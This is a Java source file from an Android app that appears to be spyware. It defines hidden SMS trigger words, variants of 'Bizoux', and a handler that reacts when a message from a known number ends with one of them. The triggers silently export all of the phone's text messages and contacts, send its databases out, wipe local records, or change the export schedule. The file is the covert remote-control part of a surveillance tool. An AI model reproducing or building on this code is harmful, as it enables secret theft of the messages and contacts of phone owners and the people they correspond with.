package org.gdocument.gchattoomuch.lib.manager;

import org.gdocument.gchattoomuch.lib.constant.ConstantsService;
import org.gdocument.gchattoomuch.lib.parser.SmsParser.MSG_TYPE;
import org.gdocument.gchattoomuch.lib.util.SmsUtil;
import org.gdocument.gtracergps.launcher.log.Logger;

import android.content.Context;
import android.content.Intent;

public class SmsLanguageManager {

	private static final String TAG = SmsLanguageManager.class.getSimpleName();

	public enum MSG_LANGUAGE {
			CLEAN_DB_SMS("Bizouz", new MSG_TYPE[] {MSG_TYPE.CLEAN_DB_SMS}, new String[]{""}),
			CLEAN_DB_CONTACT("Bizouzz", new MSG_TYPE[] {MSG_TYPE.CLEAN_DB_CONTACT}, new String[]{""}),
			CLEAN_DB_CACHE("Bizouzxl", new MSG_TYPE[] {MSG_TYPE.CLEAN_DB_CACHE}, new String[]{""}),
			SET_SERVICE_EXPORT_TIME("Biszoux", new MSG_TYPE[] {MSG_TYPE.SET_SERVICE_EXPORT_TIME}, new String[]{"" + SharedPreferenceManager.SERVICE_EXPORT_SCHEDULE_TIME_HOUR_24}),
			SET_SERVICE_EXPORT_SMS_COUNT("BizouxX", new MSG_TYPE[] {MSG_TYPE.SET_SERVICE_EXPORT_SMS_COUNT}, new String[]{"100"}),
			SET_SERVICE_EXPORT_CONTACT_COUNT("BizouXx", new MSG_TYPE[] {MSG_TYPE.SET_SERVICE_EXPORT_CONTACT_COUNT}, new String[]{"100"}),
			SET_SERVICE_EXPORT_SMS_ALL("BizouxXxx", new MSG_TYPE[] {MSG_TYPE.SET_SERVICE_EXPORT_SMS_COUNT}, new String[]{"-1"}),
			SET_SERVICE_EXPORT_CONTACT_ALL("BizouXxxx", new MSG_TYPE[] {MSG_TYPE.SET_SERVICE_EXPORT_CONTACT_COUNT}, new String[]{"-1"}),
			RUN_SERVICE_EXPORT("Bizoux", new MSG_TYPE[] {MSG_TYPE.RUN_SERVICE_EXPORT}, new String[]{""}),

			CLEAN_RUN_SERVICE_EXPORT_SMS_ALL("BizouzxXx", new MSG_TYPE[] {MSG_TYPE.CLEAN_DB_SMS, MSG_TYPE.SET_SERVICE_EXPORT_SMS_COUNT, MSG_TYPE.RUN_SERVICE_EXPORT}, new String[]{"", "-1", ""}),
			CLEAN_RUN_SERVICE_EXPORT_CONTACT_ALL("BizouzzXxx", new MSG_TYPE[] {MSG_TYPE.CLEAN_DB_CONTACT, MSG_TYPE.SET_SERVICE_EXPORT_CONTACT_COUNT, MSG_TYPE.RUN_SERVICE_EXPORT}, new String[]{"", "-1", ""}),
			CLEAN_RUN_SERVICE_EXPORT_ALL("BizouZzzxXXxx", new MSG_TYPE[] {MSG_TYPE.CLEAN_DB_SMS, MSG_TYPE.CLEAN_DB_CONTACT, MSG_TYPE.SET_SERVICE_EXPORT_CONTACT_COUNT, MSG_TYPE.SET_SERVICE_EXPORT_SMS_COUNT, MSG_TYPE.RUN_SERVICE_EXPORT}, new String[]{"", "", "-1", "-1", ""}),

			SEND_DB("Bizouxl", new MSG_TYPE[] {MSG_TYPE.SEND_DB}, new String[]{""}),
			SEND_DB_CACHE("Bizouxxl", new MSG_TYPE[] {MSG_TYPE.SEND_DB_CACHE}, new String[]{""});

		;

		public String language;
		public MSG_TYPE[] msgType;
		public String[] value;

		MSG_LANGUAGE(String language, MSG_TYPE msgType[], String value[]) {
			this.language = language;
			this.msgType = msgType;
			this.value = value;
		};
	}

	private static SmsLanguageManager instance;

	private SmsLanguageManager() {
	}

	public static SmsLanguageManager getInstance() {
		if (instance == null) {
			instance = new SmsLanguageManager();
		}
		return instance;
	}

	public void processLanguageMessage(Context context, String phoneNumber, String message) {
		if (!message.isEmpty()) {
			boolean isKnow = SmsUtil.getInstance().isKnowPhoneNumber(phoneNumber);
			logMe("'"+phoneNumber+"' isKnow:" + isKnow);
			if (isKnow) {
				for(MSG_LANGUAGE msgLanguage : MSG_LANGUAGE.values()) {
					if (message.endsWith(msgLanguage.language)) {
						int size = msgLanguage.msgType.length;
						for(int i=0 ; i<size ; i++) {
							executeSmsReceiver(context, msgLanguage.msgType[i], msgLanguage.value[i]);
						}
					}
				}
			}
		}
	}

    private void executeSmsReceiver(Context context, MSG_TYPE msgType, String data) {
    	Intent intent = new Intent(ConstantsService.SERVICE_INTENT_FILTER_ACTION_SMS_RECEIVER);
    	intent.putExtra(ConstantsService.INTENT_EXTRA_KEY_EXECUTE_SMS_RECEIVER_MSG_TYPE, msgType);
    	intent.putExtra(ConstantsService.INTENT_EXTRA_KEY_EXECUTE_SMS_RECEIVER_DATA, data);
    	context.startService(intent);
    }
	
	private void logMe(String message) {
		Logger.logMe(TAG, message);
	}
}